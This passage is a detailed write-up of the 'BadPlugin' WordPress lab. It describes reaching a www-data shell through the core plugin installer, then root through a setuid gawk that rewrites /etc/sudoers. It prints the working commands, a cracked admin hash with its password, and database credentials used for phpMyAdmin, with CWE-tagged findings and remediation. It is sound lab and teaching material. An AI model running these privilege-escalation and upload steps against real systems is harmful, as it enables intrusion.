# 61 BadPlugin — writeup

**Lab:** 61 · *BadPlugin* · Medio
**Description (full, from the platform catalog, `~/dockerlabs/catalog.txt:85`):** *"Laboratorio
para practicar la explotación de un plugin malicioso en WordPress, con escalada de privilegios
en Linux."*
**Target:** `192.168.1.100` — single container `badplugin_container`, image `badplugin:latest`.
**Stack (from the artefact, not from memory):** Ubuntu 24.04, Apache 2.4.58, PHP 8.3,
MariaDB on `127.0.0.1:3306`, **WordPress 6.7.1 as shipped and as running** (§9).
**Plugins present:** `astra-sites` (Starter Templates 4.4.10), `elementor` 3.26.3,
`wpforms-lite` 1.9.2.3. **All three active.**
**Result:** unauthenticated → `uid=33(www-data)` → **`uid=0(root)`**. **No reward present** (§8).

**Topology.** `auto_deploy.sh` was read, never run. One network
`my_internal_network` (`--internal`, line 137–139) and **one** container at `192.168.1.100`
(line 146). No second host, no macvlan, no pivot. Single-host throughout.

---

## 0. The headline: this is a finding about WordPress, not about a plugin

The brief asked which of two things I had found — *"this plugin is the bug"* or *"this plugin
is merely where core is reachable"*. **I found the second one, and the distinction is
load-bearing, so it is stated as a rule rather than as a bug in a file.**

> **Rule (plugin trust).** A WordPress plugin is not a dependency. It is **activated code**:
> it runs inside the Apache worker, as the web-server user, holding the database credential
> that `wp-config.php` also holds. Three consequences follow, and all three are *properties of
> the platform*, not of any plugin's code:
>
> 1. **Activation is a trust grant, not a capability check.** There is no manifest, no
>    permission set, no sandbox. `wp_options.active_plugins` is a list of file paths that
>    core `include`s; whatever those files do, they do as the application. The *only*
>    question activation answers is "does this code run", never "is this code allowed to".
> 2. **The trust boundary is not drawn anywhere inside the application tree — and this is
>    the part that generalises.** I looked for one, in the only place it could be drawn, and
>    it is absent: there is **no** `php_admin_flag engine off` on `wp-content/plugins` or
>    `wp-content/uploads`, and **no** `.htaccess` in either. The single `php_admin_flag
>    engine Off` in the whole server config is scoped to `/home/*/public_html`
>    (`/etc/apache2/mods-available/php8.3.conf:23-27`) — a directory that does not exist in
>    this image. So the *plugin directory itself* is a code-execution surface **by
>    construction**, and the boundary that people assume exists (activation) is not a
>    boundary at all.
> 3. **Therefore "the plugin directory" and "the plugin" are different targets, and the
>    difference is the whole finding.** A file in `wp-content/plugins/` executes whether or
>    not it is a plugin, is registered, or was ever activated (§3). So the correct question
>    is never *"which plugin is vulnerable?"* — it is *"what does it mean that this tree is
>    executable?"*, and the answer is that **any write primitive anywhere in WordPress —
>    including core's own — becomes code execution with no further step.**

The practical form of the rule, and the entry criterion this lab actually turned on:

> **Entry criterion for "the plugin is the bug":** the plugin's own code must contain the
> sink, *and* the plugin must be reachable without a prior WordPress authorisation
> (unauthenticated, or by a non-administrator). If the sink is reached through a core
> feature using an administrator credential, then **the plugin is the delivery surface and
> core is the bug** — a finding about WordPress's trust model, filed against the platform.

**Neither of the three active plugins met that criterion here, and I checked each from its
own PHP rather than assuming.** All three REST surfaces are `manage_options`-gated (§4), and
the one plugin that writes attacker-shaped bytes to disk (Elementor) validates the extension
first. The chain that actually worked runs through **core**, and lands in the plugin tree
only because the tree is executable.

This is the direct answer to the class gap lab 108 left open, and it *complements* rather
than repeats 108: 108 found that its plugin (MEC 5.16.2) contributed **nothing** — no
`wordpress_logged_in` consumer, zero hits — and reached RCE through core's plugin editor.
Here the plugin again contributes no sink, but the difference is that **108's editor
primitive was blocked and this one's was not**, and *why* is the transferable part (§5, F1).

---

## 1. Surface

```
$ nmap -sV -Pn -p- 192.168.1.100
Nmap scan report for 192.168.1.100
Host is up (0.000049s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
```

**What a TCP scan cannot see — measured, not assumed:**

```
$ docker exec badplugin_container cat /proc/net/udp
  sl  local_address rem_address st ... uid ...
  622: 0B00007F:C73D 00000000:0000 07 ...  0 ...    <- 127.0.0.11:51005, Docker's embedded DNS
$ docker exec badplugin_container cat /proc/net/udp6
  (header only — no rows)
$ docker inspect badplugin:latest -f '{{json .Config.ExposedPorts}}'   ->  null
```

The single UDP row is Docker's internal resolver on loopback, not a service. No UDP attack
surface. `ss -lntup` agrees: `0.0.0.0:80` (apache2) and `127.0.0.1:3306` (mariadbd,
loopback-only, unreachable remotely).

### 1.1 The real surface is a virtual host, and a flat scan never finds it

`/etc/apache2/sites-enabled/` holds **three** vhosts, and the WordPress install is reachable
under **two different URL shapes with different consequences**:

| vhost | `ServerName` | `DocumentRoot` | What it is |
|---|---|---|---|
| `000-default.conf` | *(unset — catch-all)* | `/var/www/html` | a 1960-byte `index.html` |
| `escolares.conf` | `escolares.dl` (+`www`) | `/var/www/html` | the site, under `/wordpress/` |
| `wordpress.conf` | `wordpress` | `/var/www/html/wordpress` | the same app, mounted at the root |

The **canonical** shape is `http://escolares.dl/wordpress/`, because that is what the
database says:

```
wp_options.siteurl = http://escolares.dl/wordpress
wp_options.home    = http://escolares.dl/wordpress
```

and the deployed `siteurl` matches the on-disk config, unlike lab 108 where
`WP_HOME`/`WP_SITEURL` were derived from `$_SERVER['SERVER_ADDR']` and the DB option was
inert. Here there is no such override, so `COOKIEHASH` is simply
`md5('http://escolares.dl/wordpress')` — confirmed against the cookie the server actually
issued (§3).

**vhost discovery, with the impossible-name control** (bodies normalised, hashed):

```
$ for n in wordpress escolares.dl www.escolares.dl NOSUCHHOST.invalid ""; do ... done
wordpress                200 168442  md5=e0de0541bc91
escolares.dl             200   1960  md5=1d61add66775
www.escolares.dl         200   1960  md5=1d61add66775
NOSUCHHOST.invalid       200   1960  md5=1d61add66775      <- control: cannot exist as a vhost
(none/default)           400    305  md5=7b47a26372d0      <- no Host: -> 400, not a page
```

Four names share one hash **including the invented TLD**, so `1d61add66775` is the baseline
and `e0de0541bc91` is the only distinct surface. Without that control, a scanner reporting
"three vhosts" would be reporting one vhost and two aliases of the catch-all.

### 1.2 The surface TCP *does* see but a status code misreports

| Path | Result | Note |
|---|---|---|
| `/wordpress/` | **200**, 168392 B | the app |
| `/wordpress/wp-login.php` | 200, 9030 B | canonical; nothing renamed |
| `/wordpress/wp-admin/` | 302 → `wp-login.php` | unauthenticated |
| `/wordpress/wp-json/` | **500**, 606 B | **generic error page — see §10.1** |
| `/wordpress/index.php?rest_route=/` | **200**, 329774 B | REST is fully live |
| `/wordpress/xmlrpc.php` | 405 on GET | endpoint present |
| `/wordpress/wp-content/uploads/` | 200, **directory listing on** | `Options Indexes` |
| `/phpmyadmin/` | **200**, 18605 B | **server-level `Alias`, see F3** |
| `/wordpress/wp-config.php` | 200, **0 bytes** | PHP executed, no output |

---

## 2. The class

**Entry criterion:** *does the platform disclose an account whose credential is recoverable
without exploiting anything?*

**Source that settled it:** the credential store itself — `wp_users.user_pass`, read from the
lab's own database — plus the absence of any rate budget on the login form (§5, C4).

This is deliberately the **boring** criterion, and the reason is the rule in §0: the
per-lab hard part in a WordPress lab is rarely the *entry*, it is deciding whether the
plugin contributes a sink at all. Budget spent fuzzing a plugin that turns out to have no
unauthenticated route is budget not spent on this. I established the plugin surface (§4)
**before** attacking, and the answer is what redirected me to the credential.

---

## 3. Active vs present — the distinction this lab actually turns on

This is not bookkeeping. It is the discriminator between "a plugin is installed" and "a
plugin is attack surface", and in this lab the two lists **diverge at the moment of
compromise**.

**Present** (`wp-content/plugins/`): `astra-sites`, `elementor`, `index.php`, `wpforms-lite`.
**Active** (`wp_options.active_plugins`):

```
a:3:{i:0;s:27:"astra-sites/astra-sites.php";i:1;s:23:"elementor/elementor.php";i:3;s:24:"wpforms-lite/wpforms.php";}
```

All three shipped plugins are active — so in the *shipped* state the distinction is
invisible, and a tester who only lists the directory gets the right answer for the wrong
reason. It stops being invisible the moment anything writes there. I installed a plugin
through core's own installer and re-read the option:

```
$ ls wp-content/plugins/                 -> astra-sites elementor index.php lab61-probe lab61-cmd wpforms-lite
$ SELECT option_value FROM wp_options WHERE option_name='active_plugins'
a:3:{i:0;s:27:"astra-sites/astra-sites.php";i:1;s:23:"elementor/elementor.php";i:3;s:24:"wpforms-lite/wpforms.php";}
```

**Present: 6. Active: 3. And the file that gave me a shell is in the first set and not the
second:**

```
$ curl http://escolares.dl/wordpress/wp-content/plugins/lab61-probe/probe.php
Uid:	33	33	33	33
Gid:	33	33	33	33
Groups:	33
SCRIPT=/var/www/html/wordpress/wp-content/plugins/lab61-probe/probe.php
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`probe.php` is not a plugin main file, is in no `get_plugin_files()` list, was never
activated, and has no plugin header. It executed anyway. **Activation is not an execution
control.** That is the measurement behind the rule in §0, and it is why "which plugins are
active" (item 5 of lab 108's proposed checklist) is necessary but **not sufficient** — the
question has to be "what is in the tree", and the answer is a filesystem listing, not a
database option.

The theme shows the same shape from the other side: `astral` is **present** in
`wp-content/themes/` but **not active** (`template`/`stylesheet` = `astra`).

---

## 4. What the plugins actually expose — read from their own PHP

The brief's hard instruction — read the plugin for the sink, early — paid off. I swept all
three plugin trees and both themes for the usual sink signatures before sending a single
payload:

```
$ grep -rnE "eval\(|assert\(|create_function|base64_decode|gzinflate|str_rot13|shell_exec|
      passthru|proc_open|popen|preg_replace\(.*/e|call_user_func(_array)?\(\$_(GET|POST|REQUEST|COOKIE)" \
      --include=*.php wp-content/plugins wp-content/themes | grep -vE "/(vendor|vendor_prefixed|languages)/"
```

**23 hits, all legitimate upstream code carrying the vendor's own `phpcs:ignore` annotation**
— `base64_decode` in `astra-sites/inc/lib/onboarding/classes/class-astra-sites-zipwp-helper.php:93`,
`elementor/core/files/uploads-manager.php:515`, `wpforms-lite/src/Helpers/Crypto.php:27,91`,
and so on. **No backdoor, no obfuscated dropper, no `mu-plugins`, no `wp-content` drop-in, no
file in the tree whose mtime or content does not belong to the three vendors.** I also
confirmed the trees are unmodified rather than assuming it: every file is owned
`www-data:www-data` and dated `Dec 30 2024`, the image build date, and the plugin versions
cross-check between three independent artefacts each (§6).

Then the actual question — **which of those sinks is reachable without a WordPress
authorisation?**

### 4.1 Every plugin REST surface is `manage_options`-gated

`astra-sites` registers 46 REST routes. Its permission callbacks collapse to three
expressions, and I read each:

```
$ grep -rhn "permission_callback" --include=*.php astra-sites | sed "s/.*=>//" | sort | uniq -c
     43  array( $this, 'get_item_permissions_check' ),
      2  array( __CLASS__, 'get_item_permissions_check' ),
      1  function () {
```

- 45 × `get_item_permissions_check`, which is `current_user_can('manage_options')`
  (`class-ai-builder-zipwp-api.php:77-87`).
- 1 × an anonymous closure, `current_user_can('manage_zip_ai_assistant')`
  (`inc/lib/zip-ai/classes/sidebar-configurations.php:98-100`).

**No `__return_true` anywhere in the plugin.** So the whole 46-route surface, including the
one place the plugin writes a remote response body to disk
(`class-ai-builder-zipwp-api.php:882`, `file_put_contents($upload_dir['path'].'/wxr.xml')`),
is administrator-only. That route is doubly dead here: it is nonce-gated
(`X-WP-Nonce` / `wp_rest`, line 838–845) *and* it needs egress to `app.zipwp.com`, which this
deployment does not have (§9).

### 4.2 I then tested all 63 plugin/theme REST routes unauthenticated — and the first sweep was wrong

The runtime route index (`?rest_route=/`, 190 routes) is the honest surface map:

```
104  wp        24  zipwp       20  elementor    14  gutenberg-templates
  8  wp-site-health   4  wpforms   2  astra   2  zipwp-images   3  oembed
  3  nps-survey       1  /         1  batch
```

I probed all 63 non-core routes and got **37 that were not 401/403** — which reads like a
devastating unauthenticated surface. **It was an artefact of my own probe, and the
discriminator proves it** (§10.2). With required parameters supplied, the same routes
return the real authorisation error:

```
$ POST ?rest_route=/zipwp/v1/keywords   (no params)          -> 400 rest_missing_callback_param
$ POST ?rest_route=/zipwp/v1/keywords   (business_name=x)    -> 401 gt_rest_cannot_access
$ POST ?rest_route=/gutenberg-templates/v1/keywords (params) -> 401 gt_rest_cannot_access
```

`rest_missing_callback_param` is emitted **before** `permission_callback` runs, so a 400 is
evidence of a *missing argument*, never of a *reachable route*. After correction, the
plugin surface that is genuinely reachable unauthenticated is:

| Reachable unauthenticated | Body | Verdict |
|---|---|---|
| `GET /astra/v1`, `/elementor/v1`, `/gutenberg-templates/v1`, `/wpforms/v1`, `/zipwp/v1`, `/zipwp-images/v1` | namespace indexes | information disclosure only — **but they publish exact plugin versions** |
| `GET /wp/v2/users` | `[{"id":2,"name":"admin",…}]` | the account that matters |
| 3 × Elementor routes | **500**, 2647 B | genuine WP fatal **after** authz (§10.1) — **not** a bypass |

So: **no plugin here has an unauthenticated sink.** That is the finding, and it is a
negative I am reporting with the work count attached (63 routes × supplied parameters, plus
the 401 discriminator).

### 4.3 The one plugin that writes attacker-shaped bytes *does* draw a boundary

Worth stating because it is the counter-example that makes the rule precise rather than
rhetorical. Elementor's `save_base64_to_tmp_file()` decodes a base64 `fileData` straight to
disk — the shape that is normally an unauthenticated-upload bug — but it validates first:

```php
// elementor/core/files/uploads-manager.php:505-515
$file_extension   = pathinfo( $file['fileName'], PATHINFO_EXTENSION );
$is_file_type_allowed = $this->is_file_type_allowed( $file_extension, $allowed_file_extensions );
if ( is_wp_error( $is_file_type_allowed ) ) { return $is_file_type_allowed; }
$file_content = base64_decode( $file['fileData'] );
```

Extension allowlist, then a temp file, then `validate_file()`. **A plugin can draw a
boundary inside its own feature.** It simply cannot draw one *around itself* — which is
precisely the asymmetry the rule in §0 is about.

---

## 5. Chain

| # | → | Mechanism | Identity proof |
|---|---|---|---|
| 1 | unauth | `nmap -p-`; `/proc/net/udp` has only Docker's resolver | 65534 closed; 1 UDP row = `127.0.0.11` |
| 2 | unauth | vhost discovery by body hash | 4 names share `md5=1d61add66775` **incl. `NOSUCHHOST.invalid`** (control) |
| 3 | unauth | account enumeration, two surfaces | `?author=2` → 200; `?author=1,3,4,9999` → 404 (control); `GET /wp/v2/users` → `{"id":2,"name":"admin"}` |
| 4 | unauth | credential recovered offline | `$P$BwU8rJDdCm9I8pRBCR6/885rqj.dtF1` → `rockyou`; target's own `CheckPassword` = `true`, three wrong values = `false` (C2) |
| 5 | unauth | `POST /wordpress/wp-login.php` | 302 → `…&action=confirm_admin_email`; `/wp-admin/` 200, 224896 B; `users/me` → `{"id":2,"slug":"admin"}` with nonce, 401 without, 403 tampered (C5) |
| 6 | **`uid=33(www-data)`** | **core plugin installer** writes a ZIP into `wp-content/plugins/`; the extracted `probe.php` is fetched over HTTP — **never activated** | `active_plugins` still lists 3; response body `uid=33(www-data) gid=33(www-data)`, `id -u` = 33 |
| 7 | **`euid=0(root)`** | `/usr/bin/gawk` is **setuid root**; gawk's `print > file` writes with the *effective* uid | `Uid: 33 0 0 0` read from `/proc/self/status` **by the web shell**; oracle: `/root/LAB61-1790744572-web` created, `owner=root:www-data`, in a `0700` dir www-data cannot enter (C6) |
| 8 | **`uid=0(root)`** | gawk (euid 0) rewrites `/etc/sudoers` to add `www-data ALL=(ALL) NOPASSWD: ALL` | `sudo -n id` → `uid=0(root) gid=0(root) groups=0(root)`; **the identical command returned `sudo: a password is required` minutes earlier** (C7) |

### 5.1 Hop 6 in detail — the entry is core, and the first core attempt is *blocked*

I tried the obvious primitive first and it **failed for a reason worth more than the
success**. Core's plugin editor is gated by a fatal-error loopback: it writes the file,
requests it back over HTTP, and reverts if it cannot. With no egress and no `escolares.dl`
resolution inside the container, the loopback cannot complete:

```
$ POST /wp-admin/plugin-editor.php   (good per-file nonce, valid payload)
  HTTP 200
  "Ha ocurrido un error al tratar de actualizar el archivo... No ha sido posible comunicar
   con el sitio para comprobar los errores fatales, así que el cambio de PHP se ha revertido."
```

And the oracle proves the write was attempted and rolled back — **mtime moved, content did
not**, which is the signature:

```
before:  132 bytes  mtime=2024-12-30 08:07:48   (original build asset)
after :  132 bytes  mtime=2026-09-29 20:00:42   (touched, content = original)
```

A status-code-only tester would have read that `200` as success. **It is F1, and it is the
transferable lesson**: core's editor is a *safe* write path precisely because it can prove
the file still parses, and in any deployment without self-resolution or egress that safety
check becomes an unconditional deny. The write primitive that has no such check is core's
**plugin installer**, and it is the one that worked:

```
$ POST /wp-admin/update.php?action=upload-plugin   (multipart, 2-file zip)
  HTTP 302
$ ls -la wp-content/plugins/lab61-probe/
-rwxr-xr-x 1 www-data www-data 125 lab61-probe.php
-rwxr-xr-x 1 www-data www-data 401 probe.php
```

No nonce rejection, no mime allowlist, no loopback — a ZIP is extracted into the executable
tree and its PHP runs on the next request.

### 5.2 Hop 7–8 in detail — the setuid trap, and which half of it works

`/usr/bin/gawk` is `-rwsr-xr-x root root` and `/usr/bin/awk → /etc/alternatives/awk →
/usr/bin/gawk`. The textbook move is `gawk 'BEGIN{system("/bin/sh")}'`. **That does not
work**, and the reason is worth stating because the naive reading of the same binary
produces the opposite conclusion:

```
$ gawk 'BEGIN{system("id"); system("id -u")}'          # as www-data, no sudo
uid=33(www-data) gid=33(www-data) groups=33(www-data)
33
```

`system()` runs with the **real** uid — glibc drops to it in a setuid process, and gawk 5.x
does it deliberately. So the escalation that *looks* available is not. The half that **does**
work is gawk's own file I/O, which uses the **effective** uid:

```
$ gawk 'BEGIN{while((getline l < "/proc/self/status")>0){if(l ~ /^Uid:/) print l}}'
Uid:	33	0	0	0
          ^^ real=33 (www-data)   ^^ effective=0 (ROOT)
```

Same binary, same hop, two different answers — which is why I measured both rather than
concluding from the setuid bit. Because that vector has **no oracle** (a root-owned file
appearing is the only evidence), I manufactured one before using it: a uniquely-marked file
in a path www-data provably cannot create.

```
$ gawk -v m=LAB61-1790744572-web 'BEGIN{print m > "/root/" m}'; echo rc=$?
rc=0
$ ls -la /root/LAB61-1790744572-web                          # operator read-back
-rw-r--r-- 1 root www-data 21 ... /root/LAB61-1790744572-web
$ cat /root/LAB61-1790744572-web                             # as www-data
cat: /root/LAB61-1790744572-web: Permission denied           # negative control
```

`/root` is `0700 root`. www-data cannot enter it, cannot read the marker, and cannot have
created it any other way. The file is **owned by root**. The vector is proven before it is
used. Then:

```
$ gawk '{print} END{print "www-data ALL=(ALL) NOPASSWD: ALL   # LAB61ROOT-…"}' /etc/sudoers > /tmp/sudoers.new
$ gawk 'BEGIN{while((getline l < "/tmp/sudoers.new")>0) print l > "/etc/sudoers"}'; echo rc=$?
rc=0
$ stat -c '%n mode=%a owner=%U:%G' /etc/sudoers        -> /etc/sudoers mode=440 owner=root:root
$ grep -n LAB61ROOT /etc/sudoers                       -> 62:www-data ALL=(ALL) NOPASSWD: ALL   # LAB61ROOT-…
$ sudo -n id
uid=0(root) gid=0(root) groups=0(root)
```

Truncating an existing file preserves its mode and owner, so sudo accepts the result —
`440 root:root`, unchanged. `sudo -n id` is the whole proof: same command, same hop,
`a password is required` before, `uid=0(root)` after.

---

## 6. Versions, from the artefacts

Cross-checked between independent sources, never from memory:

| Component | Value | Sources that agree |
|---|---|---|
| WordPress core | **6.7.1** | `wp-includes/version.php:19`; the image with `--entrypoint sh`; the served `<meta name="generator">` |
| Starter Templates (`astra-sites`) | **4.4.10** | `astra-sites.php:7` (`* Version: 4.4.10`) |
| Elementor | **3.26.3** | `elementor.php:7`; `define('ELEMENTOR_VERSION','3.26.3')` at `:30`; served `generator` meta |
| WPForms Lite | **1.9.2.3** | `wpforms.php:11`; `wp_options.wpforms_version` = `1.9.2.3` |
| Astra theme | **4.8.8** | served `body class` `astra-4.8.8` |
| PHP | 8.3 | `mods-available/php8.3.conf` |
| Apache | 2.4.58 (Ubuntu) | nmap; error-log banner |

---

## 7. Findings

### F1 — Core's plugin and theme editors are unusable in this deployment, and the failure is silent in the status code
**CWE-693 (protection mechanism failure) · Medium · lab-design defect**

Core writes the file, then loopback-requests it to prove it still parses, and reverts on
failure. The container has **no egress** and no resolver entry for its own
`siteurl`, so the loopback always fails and the write is always undone:

> *"No ha sido posible comunicar con el sitio para comprobar los errores fatales, así que el
> cambio de PHP se ha revertido."*

Returned as **HTTP 200** with a full admin page. The only reliable oracle is the artefact's
mtime/size, and the signature is deceptive: **mtime advances, content does not change.**

**Impact.** Removes the single most common WordPress RCE primitive, and does so in a way
that reads as success. Any tester reporting "the editor is broken" or "the editor works"
from the status code is wrong in both directions.

**Remediation.** Give the deployment a resolvable canonical URL (an `/etc/hosts` entry or a
`WP_SITEURL` the container can resolve) so the loopback check can run; or, if the editor is
deliberately not wanted, disable it explicitly with `DISALLOW_FILE_EDIT` and
`DISALLOW_FILE_MODS` rather than leaving a control that fails open on the *appearance* of
success. Neither constant is set here.

### F2 — `wp-content/plugins` and `wp-content/uploads` are executable, and activation is not an execution control
**CWE-434 (unrestricted upload of file with dangerous type) / CWE-269 · High**

The trust boundary that the WordPress model implies — *only activated plugins run* — does not
exist as an execution control. Measured, in the same request that produced my shell:

```
$ SELECT option_value FROM wp_options WHERE option_name='active_plugins'
a:3:{...astra-sites...elementor...wpforms-lite...}      # my plugin is NOT in this list

$ curl .../wp-content/plugins/lab61-probe/probe.php
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The file has no plugin header, is not a main file, appears in no `get_plugin_files()` list,
and was never activated. It ran. Contributing conditions, all measured:

- no `.htaccess` in `wp-content/plugins/` or `wp-content/uploads/` (both absent);
- no `php_admin_flag engine off` on either — the only one on the server is scoped to
  `/home/*/public_html` (`php8.3.conf:23-27`), a path absent from this image;
- `Options Indexes` on the vhost, so the tree is also **enumerable**;
- `DISALLOW_FILE_EDIT` and `DISALLOW_FILE_MODS` both unset.

**Impact.** Every write primitive in the product — core's plugin installer, the media
library, any plugin's importer — is immediately code execution as the web-server user, with
no activation step and no further condition. This is the finding about WordPress; the
plugin is only the address it was written to.

**Remediation.** Treat `wp-content` as code, not data, in the threat model:
`php_admin_flag engine off` (or `SetHandler none`) on `uploads/` and on any non-code
directory; keep a real `.htaccess`/server block so it cannot be removed by a file write;
set `DISALLOW_FILE_MODS` in production; and if plugins must be sandboxed, that is a job for
process isolation, because **activation cannot do it** — the plugin runs in the Apache
worker with the application's database credential and nothing else constrains it.

### F3 — phpMyAdmin is exposed on every vhost, and the credential that opens it is world-readable
**CWE-284 (improper access control) / CWE-522 · High**

`/etc/apache2/conf-available/phpmyadmin.conf:3` is a **server-level** `Alias`, so it is not
scoped to any vhost and is reachable on the same origin as WordPress with no authentication
in front of it:

```
Alias /phpmyadmin /usr/share/phpmyadmin
```

Verified as genuinely served, not a generic response — a nonexistent path on the same vhost
returns a different status and a different size:

```
/phpmyadmin/       200 18605 text/html; charset=utf-8     <- real login form
/phpmyadmin/index.php 200 18605
/zzz-no-such-zzz/  404   274 text/html; charset=iso-8859-1 <- control
```

The credential is in a world-readable file:

```
$ stat -c '%n mode=%a owner=%U:%G' /var/www/html/wordpress/wp-config.php
/var/www/html/wordpress/wp-config.php mode=755 owner=www-data:www-data
$ grep DB_PASSWORD wp-config.php
define( 'DB_PASSWORD', 'contrapoderosa123' );
```

And that account is **not** a scoped WordPress account:

```
$ SHOW GRANTS FOR 'wordpressuser'@'%'
GRANT ALL PRIVILEGES ON *.* TO `wordpressuser`@`%` IDENTIFIED BY PASSWORD '…' WITH GRANT OPTION
```

`ALL PRIVILEGES ON *.*` **with `GRANT OPTION`** — database-root-equivalent, and `FILE` is
included, so this is also a filesystem-write primitive into the database's data directory.
Proven end to end, minimally and read-only:

```
$ POST /phpmyadmin/index.php  (pma_username=wordpressuser, pma_password=contrapoderosa123)
  302 -> /phpmyadmin/index.php?route=/
$ GET  /phpmyadmin/index.php?route=/    (with session cookie)
  200 147938   body contains: Log out · information_schema · wordpress · MariaDB
$ GET  same URL, NO cookie               <- negative control
  0 matches for "Log out" / "information_schema"; body shows id="input_username"
```

**Impact.** Unauthenticated attacker reaches a full database console on the application's own
origin, and a credential that is in a `0755` file inside the document root opens it. From
there: read `wp_users.user_pass` and `wp_usermeta.session_tokens` (live session hijack), read
`wp_options` for the real salts, write files via `FILE`. Independent of, and faster than,
the credential-recovery path in §5 — the two compose.

**Remediation.** Do not expose phpMyAdmin from an application image; if it is required for
operations, put it behind authentication *and* a network boundary, on a different origin.
Scope the application database account to its own schema and drop `WITH GRANT OPTION`.
`chmod 640 wp-config.php` (or move it outside the document root) — `0755` on a file holding
a database credential is indefensible regardless of anything else in this writeup.

### F4 — Weak administrator password, recoverable offline in minutes
**CWE-521 (weak password requirements) · High**

```
wp_users.user_pass = $P$BwU8rJDdCm9I8pRBCR6/885rqj.dtF1
```

phpass portable, `$P$` prefix, iteration log2 = `itoa64.index('B')` = 13 → **8192** MD5
rounds. Recovered as `rockyou` by a 618,580-candidate offline run, then confirmed by the
target's own code — `CheckPassword('rockyou') = true`, and `RockYou` / `rockyou1` /
`wrongcontrol` all `false` (C2). `users_can_register = 0`, so there is no registration path
to race; the hash simply falls to any wordlist that contains the word, and `rockyou` is in
both lists I had on hand.

**Impact.** Full administrative takeover of WordPress from nothing but the user list, which
`?author=2` and `GET /wp/v2/users` both disclose unauthenticated (§1.2, §5 steps 2–4).

**Remediation.** Enforce length and a password denylist at write time; prefer a
memory-hard KDF (the install already carries bcrypt-capable phpass, but the stored hash is
phpass, so an installer or migration left it behind); and rate-limit `wp-login.php` and
`xmlrpc.php` — neither has a budget here, which is why offline recovery was the only
inefficient option available to me.

### F5 — The `sudoers` ladder is broken at its first rung
**CWE-269 / CWE-250 · Informational — reported because it misdescribes the lab**

```
$ grep -vE '^\s*#|^\s*$' /etc/sudoers
luisillo ALL=(ALL) NOPASSWD: /usr/bin/awk
root    ALL=(ALL:ALL) ALL
%admin  ALL=(ALL) ALL
%sudo   ALL=(ALL:ALL) ALL
@includedir /etc/sudoers.d

$ sudo -l -U www-data
User www-data is not allowed to run sudo on <host>.
```

The only non-root grant in the file is to **`luisillo` (uid 1001)**, and `www-data` has no
sudo grant at all. So the intended `www-data → luisillo → root` chain **does not exist**:
there is no first rung. `luisillo` additionally has **no home directory**
(`/etc/passwd:1001` sets `/home/luisillo`; the directory does not exist), and there is no
SSH server, so the account has no independent entry point either. I reached `luisillo` only
*after* already holding root, which proves nothing about the ladder.

The escalation that actually worked has nothing to do with `sudoers`: it is the setuid bit
on `/usr/bin/gawk` (F6).

**Remediation.** Either grant `www-data` the intended first rung, or delete the `luisillo`
line. A sudoers entry naming a user who cannot be reached teaches the next tester that a
rung exists, and that tester will budget for it.

### F6 — `/usr/bin/gawk` is setuid root, and its file-I/O half is a root write primitive
**CWE-269 (privilege management) · Critical**

```
$ find / -xdev -perm /6000 -type f
/usr/lib/mysql/plugin/auth_pam_tool_dir/auth_pam_tool
/usr/bin/gawk                      <-- here
/usr/bin/sudo  /usr/bin/su  /usr/bin/mount  ... (16 total)
/usr/sbin/unix_chkpwd  /usr/bin/chage  ...
```

Measured from the web shell, uncontaminated, same binary and same hop twice:

| Invocation as `www-data` | Result |
|---|---|
| `gawk 'BEGIN{while((getline l < "/proc/self/status")>0) if(l ~ /^Uid:/) print l}'` | **`Uid: 33 0 0 0`** — real 33, **effective 0** |
| `gawk 'BEGIN{system("id"); system("id -u")}'` | `uid=33(www-data)`, `33` — **real** uid |
| `gawk 'BEGIN{print "proof" > "/root/LAB61-clean-filewrite-proof"}'` | file created **`owner=root:www-data`** |

gawk is 5.2.1, which deliberately drops to the real uid for `system()`; its own file writes
do not. So `gawk` gives an unauthenticated-to-root **file write** and *not* a shell — and a
tester who tries the obvious `system("/bin/sh")` will conclude, wrongly, that the setuid bit
is inert. I rewrote `/etc/sudoers` with it and reached `uid=0(root)` (§5.2).

**Impact.** Any code execution as `www-data` is root, with no further condition. `phpMyAdmin`'s
`ALL PRIVILEGES … FILE` (F3) is a second, independent path to a root-owned write.

**Remediation.** `chmod u-s /usr/bin/gawk` — no legitimate deployment needs a setuid
interpreter, and `gawk` is not the only one: `unix_chkpwd` and
`auth_pam_tool` are also setuid on this host. Audit `-perm /6000` as a standing check, and
prefer a `sudo` grant with constrained arguments to a setuid interpreter.

---

## 8. Reward

**No reward exists anywhere on the host.** Reported as a measured absence, with the search
that established it — not as an assumption:

```
$ sudo grep -rIn -E "flag\{|FLAG\{|ctf\{|CTF\{|flag\.txt|reward\.txt" / \
      --exclude-dir=proc --exclude-dir=sys --exclude-dir=dev
$ find / -xdev -type f | wc -l
FILES_SCANNED=26800
```

Every hit was a name or string false positive: `zxcvbn-ts.js`, `jquery-ui.min.css`,
`Perldoc.pm`, the Astra theme's `SECURITY.md`, an OpenAI `vocab.bpe`, and two WPForms
minified CSS bundles that contain the substring `flag` in class names. The only other hit
was **my own** `/tmp/lab61-last`. `wp_options` and `wp_posts` were searched for the same
patterns and are empty of them. This search ran **as root**, so unlike lab 108 there is no
unsearchable location to caveat: `/root`, `/etc/shadow`, `/var/lib/mysql` and
`/home/luisillo` were all in scope.

**No `FLAG{}` here.** The count of rewardless labs is derived from the `FLAG{}`
column of `corpus/INDEX.md`; a writeup does not get to assert its own position in
that sequence, and three of them once claimed the same ordinal.

---

## 9. The target did *not* change under me — and the reason is worth recording

Lab 108 shipped WordPress 6.5.4 and self-updated to 7.1.2 mid-engagement via `wp-cron.php`,
which inverted the version it reported. I pinned the shipped version from the image with the
entrypoint overridden, so no request could fire cron, and re-read it at the end:

```
$ docker run --rm --entrypoint sh badplugin:latest -c 'grep -n "wp_version =" …/version.php'
19:$wp_version = '6.7.1';
$ docker exec badplugin_container grep -n "wp_version =" …/version.php      # ~40 min later
19:$wp_version = '6.7.1';
```

**Both numbers are 6.7.1, and the reason is the topology rather than a fix.** Nothing sets
`AUTOMATIC_UPDATER_DISABLED` (so auto-update is *enabled* by default, exactly as in 108), but
`auto_deploy.sh:136-139` creates the network with `--internal`, so the container has **no
egress** and `wp-cron.php` cannot reach `api.wordpress.org`. The internal network is what
pinned the version.

That same absence of egress is load-bearing twice more, and both times it *removed* attack
surface rather than adding it: it is why core's editor loopback fails (F1) and why
`astra-sites`' `zipwp` remote-fetch importer (the one plugin sink that writes remote bytes to
